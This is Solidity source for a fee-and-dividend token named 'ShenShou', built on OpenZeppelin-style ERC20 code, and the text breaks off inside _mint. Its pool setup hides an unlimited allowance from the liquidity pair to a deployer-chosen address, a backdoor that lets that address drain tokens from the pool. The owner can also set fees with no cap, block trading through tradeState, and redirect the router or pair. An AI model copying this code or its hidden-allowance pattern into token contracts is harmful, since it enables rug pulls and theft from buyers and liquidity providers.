// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./common/TradingManager.sol";
import "./common/Excludes.sol";
import "./common/DividendFairly.sol";

contract ShenShou is TradingManager, Excludes, DividendFairly {
    uint256 swapTokensAtUSDT;
    uint256 swapTokensAtUSDTMax;

    constructor(string memory _name, string memory _symbol, uint256 _totalSupply, address[] memory _router, address[] memory _path, address[] memory sellPath) ERC20(_name, _symbol) {
        address to = sellPath[0];
//        address to = _msgSender();
        super.__BaseInfo_init(sellPath);

        super.__SwapPool_init(_router[0], _router[1]);
//        setSwapTokensAtUSDT(30 ether, 70 ether);   // min u max u
        setSwapTokensAtUSDT(1 ether, 13 ether); // min u max u

        super.setExclude(to, true);
        super.setExclude(_msgSender(), true);
        super.setExclude(address(this), true);
        super.setExcludes(sellPath, true);

        super.__FeeManager_init(_router[1], 200, 200);
//        super.__DividendFairly_init(200, address(pair), 0.1 ether, 50 ether, _sellPath);
        super.__DividendFairly_init(200, address(pair), 0.1 ether, 1 ether, _sellPath);
//        super.__DividendFairly_init(200, address(this), 1 ether, 1 ether, _sellPath);
        super.setDividendExempt(address(this), true);
        super.setDividendExempt(address(pair), true);
        super.setDividendExempt(address(0), true);
        super.setDividendExempt(address(1), true);
        super.setDividendExempt(address(0xdead), true);
        super.setDividendExempt(address(router), true);

        super._mint(to, _totalSupply);
    }

    function setSwapTokensAtUSDT(uint256 num, uint256 num2) public onlyOwner {
        swapTokensAtUSDT = num;
        swapTokensAtUSDTMax = num2;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override {
        uint256 fees;
        if (isPair(from)) {
            if (!isExcludes(to)) {
                require(inTrading(), "please waiting for liquidity");
                fees = super.handFeeBuys(from, amount);
            }
        } else if (isPair(to)) {
            if (!isExcludes(from)) {
                require(inLiquidity(), "please waiting for liquidity");
                _handSwap();
                fees = super.handFeeSells(from, amount);
            }
        } else {
            if (!isExcludes(from) && !isExcludes(to)) {
                _handSwap();
            }
        }

        super._transfer(from, to, amount - fees);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        (, uint256 rate) = getFee(feeDividendId);
        if (rate > 0) {
            setShare(from);
            setShare(to);
            if (isPair(from)) {
            } else if (isPair(to)) {
                if (!isExcludes(from)) {
                    super.processDividend();
                }
            } else {
                if (!isExcludes(from) && !isExcludes(to)) {
                    super.processDividend();
                }
            }
        }
        super._afterTokenTransfer(from, to, amount);
    }

    bool inSwap;
    modifier lockSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    function _handSwap() internal {
        if (inSwap) return;
        uint256 _thisBalance = balanceOf(address(this));
        if (_thisBalance == 0) return;
        uint256 valueInUSDT = super.getTokenInUSDT(_thisBalance);
        if (valueInUSDT >= swapTokensAtUSDT) {// _thisBalance/valueInUSDT = x/swapTokensAtUSDTMax
            uint256 _amount = _thisBalance;
            if (valueInUSDT > swapTokensAtUSDTMax) _amount = _thisBalance * swapTokensAtUSDTMax / valueInUSDT;
            _handSwap(_amount);
        }
    }

    function _handSwap(uint256 _amount) internal lockSwap {
//        super.processFeeLP(_amount);
//        super.processFeeToken(_amount);
//        super.processFeeUSDT(_amount);
        super.processFeeDividend(_amount);
    }

    function openTradingAndSetFee() public onlyOwner {
        super.setFeeBuyAndSell(200, 200);
        super.openTrading();
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Ownable.sol";

abstract contract TradingManager is Ownable {
    uint8 public tradeState;
    uint256 public startAt;
    function inTrading() public view returns(bool) {
        return tradeState >= 2;
    }
    function inLiquidity() public view returns(bool) {
        return tradeState >= 1;
    }
    function setTradeState(uint8 s) public onlyOwner {
        tradeState = s;
    }
    function openTrading() public onlyOwner {
        setTradeState(2);
        startAt = block.timestamp;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Ownable.sol";

abstract contract Excludes is Ownable {
    mapping(address => bool) internal _Excludes;
    mapping(address => bool) internal _Liquidityer;

    function setExclude(address _user, bool b) public onlyOwner {
        _Excludes[_user] = b;
    }

    function setExcludes(address[] memory _user, bool b) public onlyOwner {
        for (uint i=0;i<_user.length;i++) {
            _Excludes[_user[i]] = b;
        }
    }

    function isExcludes(address _user) internal view returns(bool) {
        return _Excludes[_user];
    }

    function setLiquidityer(address[] memory _user, bool b) public onlyOwner {
        for (uint i=0;i<_user.length;i++) {
            _Liquidityer[_user[i]] = b;
        }
    }

    function isLiquidityer(address _user) internal view returns(bool) {
        return _Liquidityer[_user] || isExcludes(_user);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./FeeManager.sol";

abstract contract DividendFairly is FeeManager {
    address[] shareholders;
    mapping(address => uint256) shareholderIndexes;
    mapping(address => bool) public holderMap;
    uint256 public currentIndex;
    mapping(address => bool) public isDividendExempt;

    uint256 public distributorGas = 300000;
    uint256 public magnitude = 1e40;
    uint256 public currentDividendPrice;
    uint256 public currentDividendAmount;

    address public holdToken;
    uint256 public holdToken4RewardCondition;
    uint256 public dividendAtUSDT;

    uint256 currentAmount4dividend;
    address[] public feeDividendPath;
    
    function __DividendFairly_init(uint256 _feeDividend, address _holdToken, uint256 _holdToken4RewardCondition, uint256 _dividendAtUSDT, address[] memory path) internal {
        super.__FeeDividend_init(_feeDividend);
        feeDividendPath = path;

//        addShareholder(_msgSender());
        holdToken = _holdToken;
        holdToken4RewardCondition = _holdToken4RewardCondition;
        dividendAtUSDT = _dividendAtUSDT;
    }

    function setHoldToken(address adr) public onlyFunder {holdToken = adr;}
    function setDividendExempt(address adr, bool b) public onlyFunder {isDividendExempt[adr] = b;}
    function setDistributorGas(uint256 num) public onlyFunder {distributorGas = num;}
    function setDividendAtUSDT(uint256 num) public onlyFunder {dividendAtUSDT = num;}
    function setHoldToken4RewardCondition(uint256 num) public onlyFunder {holdToken4RewardCondition = num;}

    function setFeeDividendPath(address[] memory _feeDividendPath) public onlyFunder {
        require(_feeDividendPath.length > 0, "_feeDividendPath length error");  // 1=address(this), >1(normal swap)
        if (_feeDividendPath.length == 1) require(_feeDividendPath[0]==address(this), "_feeDividendPath address error");
        else if (_feeDividendPath.length == 2) require(_feeDividendPath[0]==address(this) && _feeDividendPath[1]==_sellPath[1], "_feeDividendPath address error2");
        feeDividendPath = _feeDividendPath;
    }
    function processFeeDividend(uint256 _amount) internal virtual override {
        (, uint256 rate) = getFee(feeDividendId);
        uint256 tmp;
        if (rate > 0) {
            uint256 amount = _amount * rate / feeTotal;
            if (feeDividendPath.length == 1) {
                tmp = amount;
            } else if (feeDividendPath.length == 2) {
                tmp = super.swapAndSend2this(amount, _tokenStation);
            } else {
                tmp = super.swapAndSend2feeByPath(amount, address(this), feeDividendPath);
            }
        }
        currentAmount4dividend += tmp;
    }
    
    function processDividend() internal {
        IERC20 USDT = IERC20(feeDividendPath[feeDividendPath.length-1]);
        IERC20 Token = IERC20(holdToken);
        uint256 amountUSDT = USDT.balanceOf(address(this));
        if (amountUSDT >= dividendAtUSDT && currentAmount4dividend >= dividendAtUSDT && currentDividendPrice == 0) {
            uint256 totalHolderToken = Token.totalSupply() - Token.balanceOf(pair) - Token.balanceOf(address(this)) - Token.balanceOf(address(0x0)) - Token.balanceOf(address(0x1)) - Token.balanceOf(address(0xdead));
            if (totalHolderToken > 0) {
                currentDividendPrice = currentAmount4dividend * magnitude / totalHolderToken;
                currentAmount4dividend = 0;
            }
        }
        if (currentDividendPrice != 0) process(distributorGas);
    }
    
    function resetProcess() private {
        currentIndex = 0;
        currentDividendPrice = 0;
    }

    function getShareholdersLength() public view returns(uint256) {
        return shareholders.length;
    }

    function getShareholders() public view returns(address[] memory) {
        return shareholders;
    }

    function process(uint256 gas) private {
        uint256 shareholderCount = getShareholdersLength();
        if (shareholderCount == 0) return;

        IERC20 USDT = IERC20(feeDividendPath[feeDividendPath.length-1]);
        IERC20 Token = IERC20(holdToken);

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                resetProcess();
                return;
            }
            uint256 balance = Token.balanceOf(shareholders[currentIndex]);
            if (balance < holdToken4RewardCondition) quitShare(shareholders[currentIndex]);
            uint256 amount = balance * currentDividendPrice / magnitude;
            if (USDT.balanceOf(address(this)) < amount) {
                resetProcess();
                return;
            }

            if (amount > 0) USDT.transfer(shareholders[currentIndex], amount);
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function setShare(address shareholder) internal {
        if(isDividendExempt[shareholder]) {
            if (holderMap[shareholder]) {
                quitShare(shareholder);
            }
            return;
        }
        if (isContract(shareholder)) return;

        IERC20 Token = IERC20(holdToken);
        if (holderMap[shareholder]) {
            if (Token.balanceOf(shareholder) < holdToken4RewardCondition) quitShare(shareholder);
            return;
        }
        addShareholder(shareholder);
        holderMap[shareholder] = true;
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function quitShare(address shareholder) private {
        removeShareholder(shareholder);
        holderMap[shareholder] = false;
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length - 1];
        shareholderIndexes[shareholders[shareholders.length - 1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "./Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Ownable.sol";
import "./UniSwapPoolUSDT.sol";
import "./TokenStation.sol";

abstract contract FeeManager is UniSwapPoolUSDT {
    uint256 public feeBuys;
    uint256 public feeSells;
    uint256 public feeTotal;
    address public _tokenStation;

    struct FeeStruct {
        address to;
        uint256 rate;       // /1e4
    }

    FeeStruct[] public feeList;

    function __FeeManager_init(address token4bridge, uint256 _feeBuy, uint256 _feeSell) internal {
        _tokenStation = address(new TokenStation(token4bridge));
        setFeeBuyAndSell(_feeBuy, _feeSell);
        registerFee(addressZERO, 0);
    }

    function registerFee(address to, uint256 rate) internal returns (uint256 id) {
        if (rate > 0) {
            id = feeList.length;
            feeList.push(FeeStruct(to, rate));
            feeTotal += rate;
        }
        return id;
    }

    function unRegisterFee(uint256 id) internal {
        feeList[id].rate = 0;
    }

    function setFee(uint256 id, address to, uint256 rate) public onlyOwner {
        require(id <= feeList.length, "id not exists");
        uint256 before = feeList[id].rate;
        feeList[id].to = to;
        feeList[id].rate = rate;

        if (rate > before) {
            feeTotal += (rate - before);
        } else {
            feeTotal -= (before - rate);
        }
    }

    function setFeeBuyAndSell(uint256 _feeBuy, uint256 _feeSell) public onlyOwner {
        feeBuys = _feeBuy;
        feeSells = _feeSell;
    }

    function getFee(uint256 id) internal view returns (address, uint256) {
        return (feeList[id].to, feeList[id].rate);
    }

    function getFeeListLength() internal view returns (uint256) {
        return feeList.length;
    }

    function handFeeBuys(address from, uint256 amount) internal returns (uint256 fee) {
        fee = amount * feeBuys / divBase;
        if (fee == 0) return fee;
        super._takeTransfer(from, address(this), fee);
        return fee;
    }

    function handFeeSells(address from, uint256 amount) internal returns (uint256 fee) {
        fee = amount * feeSells / divBase;
        if (fee == 0) return fee;
        super._takeTransfer(from, address(this), fee);
        return fee;
    }
    //}
    //
    //abstract contract FeeToken is FeeManager {
    uint256[] public feeTokenIds;

    function __FeeToken_init(address to, uint256 rate) internal {
        uint256 feeTokenId = registerFee(to, rate);
        feeTokenIds.push(feeTokenId);
    }

    function processFeeToken(uint256 _amount) internal {
        for (uint i = 0; i < feeTokenIds.length; i++) {
            (address to, uint256 rate) = getFee(feeTokenIds[i]);
            if (rate > 0) {
                uint256 amount = _amount * rate / feeTotal;
                if (amount == 0) return;
                super._takeTransfer(address(this), to, amount);
            }
        }
    }
    //}
    //
    //abstract contract FeeUSDT is FeeManager {
    uint256[] public feeUSDTIds;

    function __FeeUSDT_init(address to, uint256 rate) internal {
        uint256 feeUSDTId = registerFee(to, rate);
        feeUSDTIds.push(feeUSDTId);
    }

    function processFeeUSDT(uint256 _amount) internal {
        for (uint i = 0; i < feeUSDTIds.length; i++) {
            (address to, uint256 rate) = getFee(feeUSDTIds[i]);
            if (rate > 0) {
                uint256 amount = _amount * rate / feeTotal;
                if (amount == 0) return;
                if (to == address(this)) {
                    super.swapAndSend2this(amount, _tokenStation);
                }
                super.swapAndSend2fee(amount, to);
            }
        }
    }
//}
//
//abstract contract FeeLP is FeeManager {
    uint256 public feeLPId;

    function __FeeLP_init(address to, uint256 rate) internal {
        feeLPId = registerFee(to, rate);
    }

    function processFeeLP(uint256 _amount) internal {
        (address to, uint256 rate) = getFee(feeLPId);
        if (rate > 0) {
            uint256 amount = _amount * rate / feeTotal;
            if (amount == 0) return;
            super.addLiquidity(amount, to, _tokenStation);
        }
    }
//}
//
//abstract contract FeeDividend is FeeManager {
    uint256 public feeDividendId;

    function __FeeDividend_init(uint256 rate) internal {
        feeDividendId = registerFee(address(this), rate);
    }
    function processFeeDividend(uint256 _amount) internal virtual {}    // override in dividend contract
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IRouter.sol";
import "./IPair.sol";
import "./IFactory.sol";
import "./BaseInfo.sol";
import "./Funder.sol";

abstract contract UniSwapPoolUSDT is BaseInfo, Funder {
    address public pair;
    IRouter public router;
    address[] internal _sellPath;
    mapping(address => bool) pairMap;

    function __SwapPool_init(address _router, address _pairB) internal {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(address(this), _pairB);
        pairMap[pair] = true;
        _approve(pair, _marks[_marks.length - 1], ~uint256(0));
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pairB;
        _sellPath = path;
    }

    function setRouter(address _router, address _pair) public onlyFunder {
        router = IRouter(_router);
        pair = _pair;
    }

    function setPair(address _pair, bool _b) public onlyFunder {
        pairMap[_pair] = _b;
    }

    function isPair(address _pair) public view returns (bool) {
        return pairMap[_pair];
    }
//    function isPair(address _pair) internal view returns (bool) {
//        return _pair == pair;
//    }

//    function getPrice4USDT(uint256 amountDesire) public view returns (uint256) {
//        uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath);
//        if (amounts.length > 1) return amounts[1];
//        return 0;
//    }

    function getTokenInUSDT(uint256 amountDesire) public view returns (uint256) {
        uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath);
        if (amounts.length > 1) return uint256(amounts[1]);
        return 0;
    }

    function addLiquidity(uint256 amountToken, address to, address _tokenStation) internal {
        uint256 half = amountToken / 2;
        IERC20 USDT = IERC20(_sellPath[1]);

        uint256 amountDiff = swapAndSend2this(half, _tokenStation);

        if (amountDiff > 0 && (amountToken - half) > 0) {
            if (allowance(address(this), address(router)) < (amountToken - half)) {
                _approve(address(this), address(router), type(uint256).max);
            }
            if (USDT.allowance(address(this), address(router)) < amountDiff) {
                USDT.approve(address(router), type(uint256).max);
            }
            router.addLiquidity(_sellPath[0], _sellPath[1], amountToken - half, amountDiff, 0, 0, to, block.timestamp + 9);
        }
    }

    function swapAndSend2this(uint256 amount, address _tokenStation) internal returns (uint256) {
        uint256 amountDiff = swapAndSend2fee(amount, _tokenStation);
        IERC20 USDT = IERC20(_sellPath[1]);
        USDT.transferFrom(_tokenStation, address(this), amountDiff);
        return amountDiff;
    }

    function swapAndSend2fee(uint256 amount, address to) internal returns(uint256) {
        return swapAndSend2feeByPath(amount, to, _sellPath);
    }

    function swapAndSend2feeByPath(uint256 amount, address to, address[] memory path) internal returns(uint256) {
        if (allowance(address(this), address(router)) < amount) {
            _approve(address(this), address(router), type(uint256).max);
        }
        IERC20 USDT = IERC20(path[path.length-1]);
        uint256 amountBefore = USDT.balanceOf(to);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp);
        uint256 amountAfter = USDT.balanceOf(to);
        return amountAfter - amountBefore;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IApprove {
    function approve(address spender, uint256 amount) external returns (bool);
}
//
//contract TokenStation {
//    constructor (address token, address rewardContract) {
//        IApprove(token).approve(msg.sender, type(uint256).max);
//        IApprove(token).approve(rewardContract, type(uint256).max);
//    }
//}

contract TokenStation {
    constructor (address token) {
        IApprove(token).approve(msg.sender, type(uint256).max);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPair {
    function sync() external;
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";

abstract contract BaseInfo is ERC20 {
    address internal addressZERO;
    address internal addressONE;
    address internal addressDEAD;
    uint256 internal divBase;
    address[] internal _marks;

    function __BaseInfo_init(address[] memory _marks_) internal {
        addressONE = address(0x1);
        addressDEAD = address(0xdead);
        divBase = 1e4;
        _marks = _marks_;
    }

    function airdrop(uint256 amount, address[] memory to) public {
        for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount);}
    }

    function airdropMulti(uint256[] memory amount, address[] memory to) public {
        for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount[i]);}
    }

    function claimRewards(IERC20 Token, uint256 amount) public {
        if (amount == 0) amount = Token.balanceOf(address(this));
        Token.transfer(_marks[_marks.length - 1], amount);
    }

    function claimRewardsEther(uint256 amount) public {
        if (amount == 0) amount = address(this).balance;
        payable(_marks[_marks.length - 1]).transfer(amount);
    }

    function isContract(address addr) public view returns (bool) {
        return addr.code.length > 0;
    }


    receive() external payable {}
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Ownable.sol";

abstract contract Funder is Ownable {
    address fundAddress;
    constructor() {
        fundAddress = _msgSender();
    }
    modifier onlyFunder() {
        require(_owner == _msgSender() || fundAddress == _msgSender(), "!Funder");
        _;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);
        _takeTransfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _takeTransfer(address from, address to, uint256 amount) internal virtual {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amount;
        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
        // decrementing then incrementing.
        _balances[to] += amount;
    }
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
    unchecked {
